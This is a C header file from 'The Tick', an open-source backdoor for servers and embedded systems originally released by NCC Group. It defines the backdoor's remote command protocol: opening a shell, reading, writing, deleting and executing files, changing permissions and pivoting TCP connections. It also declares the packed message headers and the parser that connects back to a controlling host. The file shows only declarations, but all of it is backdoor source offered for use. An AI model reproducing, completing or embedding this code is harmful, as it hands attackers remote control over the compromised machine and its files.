/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#ifndef PARSER_H
#define PARSER_H

#include "common.h"
#include "config.h"

#if TICK_FEATURES_CRYPTO
#include "ssl.h"
#endif

// Base command IDs per category.
#define BASE_CMD_SYSTEM         0x0000
#define BASE_CMD_FILE           0x0100
#define BASE_CMD_NET            0x0200

// No operation command.
#define CMD_NOP                 0xFFFF

// System commands.
#define CMD_SYSTEM_EXIT         BASE_CMD_SYSTEM + 0
#define CMD_SYSTEM_FORK         BASE_CMD_SYSTEM + 1
#define CMD_SYSTEM_SHELL        BASE_CMD_SYSTEM + 2

// File commands.
#define CMD_FILE_READ           BASE_CMD_FILE + 0
#define CMD_FILE_WRITE          BASE_CMD_FILE + 1
#define CMD_FILE_DELETE         BASE_CMD_FILE + 2
#define CMD_FILE_EXEC           BASE_CMD_FILE + 3
#define CMD_FILE_CHMOD          BASE_CMD_FILE + 4

// Network commands.
//#define CMD_HTTP_DOWNLOAD       BASE_CMD_NET + 0        // Deprecated in Apr 2021.
#define CMD_DNS_RESOLVE         BASE_CMD_NET + 1
#define CMD_TCP_PIVOT           BASE_CMD_NET + 2

// Command header.
#pragma pack(push, 1)
typedef struct              // (all values below in network byte order)
{
    uint16_t cmd_id;        // Command ID
    uint16_t cmd_len;       // Small data size, to be read in memory while parsing
    uint32_t data_len;      // Big data size, to be read by command implementations
} CMD_HEADER;
#pragma pack(pop)

// Response codes.
#define CMD_STATUS_OK      0x00
#define CMD_STATUS_ERROR   0xFF

// Response header.
#pragma pack(push, 1)
typedef struct              // (all values below in network byte order)
{
    uint8_t  status;        // Status code (OK or ERROR)
    uint32_t data_len;      // Big data size
} RESP_HEADER;
#pragma pack(pop)

// TCP pivot structure. Only IPv4 is supported.
#pragma pack(push, 1)
typedef struct              // (all values below in network byte order)
{
    uint32_t ip;            // IP address to connect to
    uint16_t port;          // TCP port to connect to
    uint16_t from_port;     // Optional TCP port to connect from
} CMD_TCP_PIVOT_ARGS;
#pragma pack(pop)

// Parser class definition.
typedef struct
{
    char uuid[16];
    char hostname[64];
    int port;
    int fd;
#if TICK_FEATURES_CRYPTO
    int use_ssl;
    SSL_Context ssl;
#endif
    CMD_HEADER header;
    char *buffer[TICK_PARSER_BUFFER_SIZE];
} Parser;

// Helper functions.
void uuid4(unsigned char *uuid);
int is_empty(const char *buffer, size_t size);

// Parser methods.
void parser_init(Parser *parser, const Settings *settings);
void parser_close(Parser *parser);
void parser_begin_response(Parser *parser, uint8_t status, uint16_t length);
void parser_ok(Parser *parser);
void parser_error(Parser *parser, const char *error);
int parser_is_connected(Parser *parser);
void parser_connect(Parser *parser);
void parser_wait(Parser *parser);
void parser_next(Parser *parser);
int parser_get_first_arg(Parser *parser);
int parser_read_first_arg(Parser *parser, char *buffer, size_t count);

#endif /* PARSER_H */
